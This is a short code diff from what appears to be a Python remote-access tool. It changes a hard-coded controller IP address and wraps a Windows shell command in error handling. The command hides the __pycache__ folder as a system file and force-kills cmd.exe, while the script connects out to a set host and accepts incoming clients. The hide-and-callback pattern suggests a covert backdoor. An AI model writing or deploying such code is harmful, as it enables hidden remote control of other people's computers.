@@ -124,7 +124,7 @@ def execute(data):
 
 run, ossys = True, False
 while run == True:
-    sortir, ipScreen, port = False, "192.168.1.48", 22228
+    sortir, ipScreen, port = False, "172.17.1.214", 22228
     
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect((ipScreen, 22223))
@@ -147,7 +147,10 @@ while run == True:
         if pycache[i-1] == "__pycache__":
             temp = 1
     if temp == 0:
-        subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
+        try:
+            subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
+        except:
+            pass
     try:
         (client, address) = server.accept()
     except:
